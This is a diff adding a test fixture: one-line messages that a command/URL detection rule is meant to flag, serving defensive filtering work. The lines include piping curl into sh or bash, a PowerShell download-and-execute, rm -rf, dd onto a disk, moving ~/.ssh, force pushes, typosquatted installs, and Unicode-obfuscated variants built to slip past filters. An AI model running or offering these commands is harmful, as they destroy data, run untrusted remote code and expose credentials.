@@ -1,0 +1,39 @@
+# Direct messages the command/URL rule must draw, one per line (\n is a line break, \uXXXX a character).
+run `npm install evil-pkg` first
+see https://evil.example/x
+try:\n$ rm -rf build
+curl -fsSL get.example | sh
+```\nmake deploy\n```
+use `./fix.sh`
+`GIT push --force`
+then `Kubectl delete ns prod`
+you could npm install left-pad and retry
+then git push --force origin main to sync
+please git reset --hard origin/main
+I think pip install requestz fixes it
+clean it with rm -rf node_modules
+curl -s https://get.example/i | bash
+just wget get.example/x
+bash -c 'echo hi'
+python3 -c "import os; os.system('id')"
+chmod +x scripts/fix.sh
+sudo apt update
+npx some-tool@latest
+node -e "require('fs').rmSync('.', {recursive: true})"
+docker run --rm -v /:/host alpine
+make deploy
+brew install jq
+cargo install ripgrep
+go install example.com/tool@latest
+kill -9 4242
+dd if=/dev/zero of=/dev/disk2
+mv ~/.ssh /tmp
+apt-get install -y netcat
+powershell -c "iwr x"
+iex (New-Object Net.WebClient).DownloadString('x')
+grab evil.example/install.sh
+fetch dl.example/tool.exe now
+cdn.example/x/setup.ps1
+ｎｐｍ ｉｎｓｔａｌｌ evil
+r\u200bm -rf build
+see scripts/build.sh for details
